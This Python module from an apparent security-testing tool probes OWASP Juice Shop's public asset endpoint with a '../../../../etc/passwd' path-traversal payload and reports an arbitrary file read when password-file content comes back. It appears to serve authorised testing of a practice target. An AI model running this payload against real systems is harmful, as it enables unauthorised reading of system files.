from __future__ import annotations

from ..core.base_module import BaseModule
from ..core.models import FindingResult, Severity

# Path traversal against Juice Shop's public asset endpoint.
# A successful read of /etc/passwd confirms the web root boundary is not enforced.
_PAYLOAD = "../../../../etc/passwd"
_ENDPOINT_TEMPLATE = "/assets/public/{}"


class PathTraversalModule(BaseModule):
    technique_id = "T1083"
    technique_name = "File and Directory Discovery (Path Traversal)"
    owasp_category = "A01:2021-Broken Access Control"
    severity = Severity.HIGH
    cvss_score = 7.5

    def execute(self) -> FindingResult:
        endpoint = _ENDPOINT_TEMPLATE.format(_PAYLOAD)
        self.log.info("Probing %s with path traversal payload", endpoint)

        resp, elapsed, error = self._request("GET", endpoint)
        result = self._build_result(_PAYLOAD, endpoint, resp, elapsed, error)

        if resp and resp.status_code == 200:
            if "root:" in resp.text or "/bin/" in resp.text:
                result.evidence = "/etc/passwd content returned — arbitrary file read confirmed."

        return result
